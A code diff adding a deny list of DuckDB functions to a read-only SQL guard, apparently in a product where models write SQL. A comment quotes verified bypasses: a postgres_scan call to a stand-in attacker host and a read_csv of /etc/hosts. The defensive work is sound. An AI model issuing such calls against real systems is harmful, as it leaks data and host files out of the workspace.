@@ -1,5 +1,57 @@
 import { DateraError } from '../errors.js';
+import { maskLiterals } from './scan-sql.js';
 import type { DuckDBConnectionPort, StatementKind } from '../ports/duckdb.js';
+
+/**
+ * Functions a user's or a model's SQL may not call.
+ *
+ * The statement-kind allowlist refuses INSTALL, LOAD, ATTACH and COPY — but it says
+ * nothing about what a SELECT *calls*, and the scanner extensions are loaded at startup.
+ * So `SELECT * FROM postgres_scan('host=attacker.tld …')` was one bound SELECT that
+ * passed the guard and opened an outbound connection, and `read_csv('/etc/hosts')`
+ * returned the file. Both verified.
+ *
+ * That is the exfiltration primitive this product can least afford, because the SQL is
+ * routinely written by a model. The egress test could not catch it either: it patches
+ * Node's sockets, and this happens inside DuckDB's native addon.
+ *
+ * Datera's own reads go through `executeInternal`, which does not pass through this guard,
+ * so denying these here costs the product nothing — a dataset is queried through its
+ * views, never by naming a file.
+ */
+const REACHING_FUNCTIONS: readonly string[] = [
+  // Another database, over the network.
+  'postgres_scan', 'postgres_scan_pushdown', 'postgres_query', 'postgres_attach',
+  'mysql_scan', 'mysql_query', 'mysql_attach',
+  'sqlite_scan', 'sqlite_attach', 'sqlite_query',
+  // The filesystem, or a URL, by name.
+  'read_csv', 'read_csv_auto', 'read_parquet', 'parquet_scan',
+  'read_json', 'read_json_auto', 'read_ndjson', 'read_ndjson_auto', 'read_json_objects',
+  'read_text', 'read_blob', 'read_xlsx',
+  'glob', 'parquet_metadata', 'parquet_schema', 'parquet_file_metadata',
+  'iceberg_scan', 'iceberg_metadata', 'delta_scan',
+];
+
+const REACHING_RE = new RegExp(`\\b(${REACHING_FUNCTIONS.join('|')})\\s*\\(`, 'i');
+
+/**
+ * Refuse a statement that calls out of the workspace.
+ *
+ * Checked against the statement with literals blanked, so a value that merely contains the
+ * text `read_csv(` is data and not a call.
+ */
+export function assertNoReachingFunctions(sql: string): void {
+  const match = REACHING_RE.exec(maskLiterals(sql));
+  if (match === null) return;
+
+  throw new DateraError(
+    'READ_ONLY_VIOLATION',
+    `${match[1]}() reads from outside this workspace, so it is not allowed here. ` +
+      'Connect the file or database as a source instead — then it is visible, versioned, ' +
+      'and read the same way as everything else.',
+    { function: match[1], sql },
+  );
+}
 
 /**
  * Invariant §1.1 / §1.2, expressed as code.
@@ -52,6 +104,12 @@ export async function assertReadOnlySql(
   if (trimmed.length === 0) {
     throw new DateraError('INVALID_ARGUMENT', 'Empty SQL statement');
   }
+
+  // Before classification, because this is true of the text regardless of how it parses,
+  // and because a refusal here should not depend on the binder succeeding — a reaching
+  // call against an unreachable host would otherwise fail as a connection error rather
+  // than as a refusal.
+  assertNoReachingFunctions(trimmed);
 
   // A parse failure throws SQL_ERROR from the driver and is deliberately not caught here:
   // a syntax error is a broken query, not an attempted write, and must not be reported
